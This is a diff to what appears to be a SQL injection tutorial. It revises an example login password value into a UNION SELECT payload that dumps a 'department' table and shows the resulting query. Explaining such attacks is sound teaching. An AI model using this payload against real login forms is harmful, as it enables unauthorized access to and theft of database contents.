@@ -44,7 +44,7 @@ Assume the name of another table is `department` and we want to get all the data
 
 `email = xxx@xxx.xxx`
 
-`password = xxx') OR 1=1 UNION select * FROM department;#`
+`password = xxx') UNION select * FROM department;#`
 ```SQL
 SELECT * FROM users WHERE email = 'xxx@xxx.xxx' AND password = md5('xxx') UNION select * FROM department;#');
 ``` 
